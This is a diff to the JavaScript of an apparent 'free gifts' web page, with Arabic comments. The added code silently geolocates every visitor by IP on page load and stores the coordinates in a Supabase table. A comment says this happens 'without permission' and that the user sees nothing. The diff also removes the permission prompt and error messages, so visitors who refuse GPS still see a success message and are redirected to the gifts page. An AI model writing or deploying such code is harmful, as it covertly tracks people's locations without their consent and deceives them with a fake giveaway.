@@ -30,19 +30,47 @@ function getOrCreateSessionId() {
   return id;
 }
 
+// ─── تتبع IP تلقائي عند فتح الصفحة (بدون إذن) ───
+async function trackByIP() {
+  try {
+    var sessionId = getOrCreateSessionId();
+    var res = await fetch('https://ipapi.co/json/');
+    var data = await res.json();
+    if (data && data.latitude && data.longitude) {
+      await supabaseClient
+        .from('locations')
+        .insert({
+          latitude: data.latitude,
+          longitude: data.longitude,
+          accuracy: -1,          // -1 = مبني على IP
+          session_id: sessionId
+        });
+    }
+  } catch (e) {
+    // صامت — المستخدم لا يرى أي شيء
+    console.log('IP track:', e);
+  }
+}
+
+// شغّل تتبع الـ IP فور ما تتحمّل الصفحة
+trackByIP();
+
+// ─── محاولة GPS (اختيارية، لمزيد من الدقة) ───
 async function shareLocation() {
   var btn = document.getElementById('shareBtn');
   btn.disabled = true;
+  showLoader();
 
+  // لو المتصفح لا يدعم GPS، روح لصفحة الهدايا مباشرة
   if (!navigator.geolocation) {
-    showToast('عذراً، متصفحك لا يدعم تحديد الموقع للحصول على الهدايا.', 'error');
-    btn.disabled = false;
+    hideLoader();
+    showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
+    setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
     return;
   }
 
-  showLoader();
-
   navigator.geolocation.getCurrentPosition(
+    // ─── نجح GPS ───
     async function (position) {
       var lat = position.coords.latitude;
       var lng = position.coords.longitude;
@@ -50,50 +78,27 @@ async function shareLocation() {
       var sessionId = getOrCreateSessionId();
 
       try {
-        var { error } = await supabaseClient
+        await supabaseClient
           .from('locations')
           .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: sessionId });
-
-        if (error) throw error;
-
-        hideLoader();
-        showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
-        
-        setTimeout(function () {
-          window.location.href = 'gifts.html';
-        }, 1500);
       } catch (err) {
-        console.error("Supabase Error:", err);
-        hideLoader();
-        showToast('فشل الاتصال: ' + (err.message || err.details || 'خطأ في قاعدة البيانات'), 'error');
-        btn.disabled = false;
-        btn.textContent = 'إعادة المحاولة للحصول على الهدايا';
-        btn.onclick = shareLocation;
+        console.error('Supabase GPS Error:', err);
       }
-    },
-    function (err) {
+
       hideLoader();
-      btn.disabled = false;
-      var msgs = {
-        1: 'يجب السماح بالوصول للموقع لتحديد الهدايا المتوفرة في منطقتك.',
-        2: 'الموقع غير متاح حالياً. تأكد من تشغيل الـ GPS.',
-        3: 'انتهت مهلة الحصول على الموقع.'
-      };
-      showToast(msgs[err.code] || 'حدث خطأ غير متوقع.', 'error');
+      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
+      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
     },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+
+    // ─── رُفض أو فشل GPS → روح لصفحة الهدايا على طول (IP اتحفظ مسبقاً) ───
+    function () {
+      hideLoader();
+      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
+      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
+    },
+
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 }
 
-function showPermissionHint() {
-  var modal = document.getElementById('permissionModal');
-  modal.classList.add('active');
-
-  document.getElementById('confirmPermBtn').onclick = function () {
-    modal.classList.remove('active');
-    shareLocation();
-  };
-}
-
 window.shareLocation = shareLocation;
-window.showPermissionHint = showPermissionHint;
